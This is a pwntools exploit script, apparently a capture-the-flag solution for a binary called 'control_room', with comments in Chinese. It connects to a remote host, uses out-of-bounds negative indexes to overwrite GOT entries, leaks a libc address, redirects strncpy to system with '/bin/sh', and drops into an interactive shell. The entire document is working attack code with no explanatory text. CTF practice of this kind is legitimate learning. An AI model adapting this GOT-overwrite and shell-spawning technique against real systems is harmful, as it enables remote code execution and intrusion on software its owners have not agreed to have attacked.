from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('./control_room')

# p = process('./control_room')
# libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

p = remote('161.35.168.118', '31311')
libc = ELF('./libc.so.6')

pause()

p.sendafter(b'username: ', b'a' * 0x100)
p.sendlineafter(b'> ', b'n')
p.sendlineafter(b'size: ', str(0x100).encode())
p.send(b'a' * 0xff)

# 准备伪造的curr_user块的值
p.sendlineafter(b'[1-5]: ', b'3')
for i in range(4):
    p.sendlineafter(b'Latitude  : ', b'1')
    p.sendlineafter(b'Longitude : ', b'1')
p.sendlineafter(b'> ', b'y')

p.sendlineafter(b'[1-5]: ', b'5')
p.sendlineafter(b'New role: ', b'1')

# 改写curr_user的地址指向伪造部分
p.sendlineafter(b'[1-5]: ', b'1')
p.sendlineafter(b'[0-3]: ', b'-2')
p.sendlineafter(b'Thrust: ', str(elf.got['setvbuf']).encode())
p.sendlineafter(b'Mixture ratio: ', str(elf.got['setvbuf']).encode())
p.sendlineafter(b'> ', b'y')

# 改写exit的GOT地址为user_register函数地址
p.sendlineafter(b'[1-5]: ', b'1')
p.sendlineafter(b'[0-3]: ', b'-7')
p.sendlineafter(b'Thrust: ', str(elf.sym['user_register']).encode())
p.sendlineafter(b'Mixture ratio: ', str(elf.sym['user_register']).encode())
p.sendlineafter(b'> ', b'y')

# 改写strncpy的GOT地址为puts
p.sendlineafter(b'[1-5]: ', b'1')
p.sendlineafter(b'[0-3]: ', b'-16')
p.sendlineafter(b'Thrust: ', str(0x401050).encode())
p.sendlineafter(b'Mixture ratio: ', str(0x401050).encode())
p.sendlineafter(b'> ', b'y')

p.sendlineafter(b'[1-5]: ', b'6')
p.sendlineafter(b'username: ', b'a')
libc.address = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\0')) - libc.sym['setvbuf']
print(hex(libc.sym['system']))

# 改写setvbuf的内容为/bin/sh
p.sendlineafter(b'[1-5]: ', b'1')
p.sendlineafter(b'[0-3]: ', b'-9')
p.sendlineafter(b'Thrust: ', str(u64(b'/bin/sh\0')).encode())
p.sendlineafter(b'Mixture ratio: ', b'0')
p.sendlineafter(b'> ', b'y')

# 改写strncpy的GOT地址为system
p.sendlineafter(b'[1-5]: ', b'1')
p.sendlineafter(b'[0-3]: ', b'-16')
p.sendlineafter(b'Thrust: ', str(libc.sym['system']).encode())
p.sendlineafter(b'Mixture ratio: ', str(0x401050).encode())
p.sendlineafter(b'> ', b'y')

# 拿到shell
p.sendlineafter(b'[1-5]: ', b'6')
p.sendlineafter(b'username: ', b'a')

p.interactive()